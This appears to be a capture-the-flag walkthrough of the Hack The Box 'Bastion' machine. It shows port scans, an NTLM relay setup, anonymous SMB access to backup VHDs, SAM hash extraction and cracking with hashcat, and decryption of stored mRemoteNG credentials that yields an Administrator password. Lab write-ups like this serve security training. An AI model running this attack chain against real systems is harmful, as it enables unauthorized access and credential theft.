```

PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
1941/tcp  closed dic-aida
2396/tcp  closed wusage
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
12934/tcp closed unknown
16859/tcp closed unknown
34061/tcp closed unknown
35874/tcp closed unknown
38146/tcp closed unknown
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49668/tcp open   msrpc        Microsoft Windows RPC
49669/tcp open   msrpc        Microsoft Windows RPC
49670/tcp open   msrpc        Microsoft Windows RPC
52306/tcp closed unknown
64719/tcp closed unknown
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m58s, deviation: 34m35s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-13T11:45:34+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-11-13T10:45:32
|_  start_date: 2024-11-13T10:18:22


```

```
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127
```

Taking a look to the smb*-security-mode,  we can observe that the signing is disabled, which is quite risky as we can perform an NTLM Relay Attack.
https://securance.com/news/smb-signing/

It looks like I cannot run the ntlmrelayx.py from impackets suite due to some permissions issues. After some struggling, I've set the network capabilities to the python3.8 binary to avoid issues:

```
sudo setcap 'cap_net_bind_service=+ep' /usr/bin/python3.8
```

So let's perform a #ntlm-relay-attack . We first set up the #repetier without the SMB and HTTP servers and the #ntlmrelayx tool:
```
./Responder.py -I tun0 -d -w -P
python3 ntlmrelayx.py -t $(cat ../../htb/tracks/crest_crt/bastion/ip)
```

Then we have everything set up, but we need some user to actually log into the system so we can capture their credentials.

Let's now check SMB to see if there is anything interesting over there:
```
smbclient -N -L //10.10.10.134

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk
	C$              Disk      Default share
	IPC$            IPC       Remote IPC

```

Connection to Backups succeeded:
```
smbclient //$(cat ip)/Backups -N

smb: \WindowsImageBackup\> ls
  .                                  Dn        0  Fri Feb 22 13:44:02 2019
  ..                                 Dn        0  Fri Feb 22 13:44:02 2019
  L4mpje-PC                          Dn        0  Fri Feb 22 13:45:32 2019

# Looks like a pc identifier L4mpje-PC
```
After searching further we managed to find some `.vhd` files. After retrieving them, we can try to access them and retrieve the SAM and SYSTEM file to extract some hashes:
#vhd #sam  #samdump2 
```
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
After doing so we retrieve those hashes, and as long as they are a NTLM hash, we try to decrypt them with hascat:
#hashcat 
```
hashcat -h | grep -i NTLM
hashcat -m 1000 -a 0 L4mpje.hash $SECLIST/../rockyou.txt

26112010952d963c8dc4217daec986d9:bureaulampje
```

After having some credentials, we can directly try to access the remote machine through ssh:
user.txt
```
acd87...
```

After running WinPEAS.exe we didn't find anything interesting. So let's take a look to the programs installed on the machine. We observe some interesting SW named `mRemoteNG` and after a quick search we can find that there's an affected version that can lead to a PEAS. https://github.com/mRemoteNG/mRemoteNG/issues/2338
```
mRemoteNG.exe NT AUTHORITY\SYSTEM:(I)(F)
                                               BUILTIN\Administrators:(I)(F)
                                               BUILTIN\Users:(I)(RX)
                                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

After some googling, we find out which is the file where the credentials are stored for mRemoteNG service: `confCons.xml`

After navigating through `C:\Users\L4mpje\AppData\Roaming\mRemoteNG` we find the `confCons.xml` file, so it's time to retrieve it:
```
scp .\confCons.xml lotape6@10.10.16.6:/home/lotape6

# it does not work, so lets try the autheticated version

scp -i .\confCons.xml lotape6@10.10.16.6:/home/lotape6
```
Finally, the key was to retrieve it with sftp from the host machine:
```
sftp $(cat user)@$(cat ip):AppData/Roaming/mRemoteNG/confCons.xml confCons.xml
```
Then we can directly go and search how to decrypt this information and found this repo: https://github.com/gquere/mRemoteNG_password_decrypt
```
Name: DC
Hostname: 127.0.0.1
Username: Administrator
Password: thXLHM96BeKL0ER2

Name: L4mpje-PC
Hostname: 192.168.1.75
Username: L4mpje
Password: bureaulampje
```

And that's it, we can now log in as `Administrator` and do whatever:
root.txt
```
5287...
```
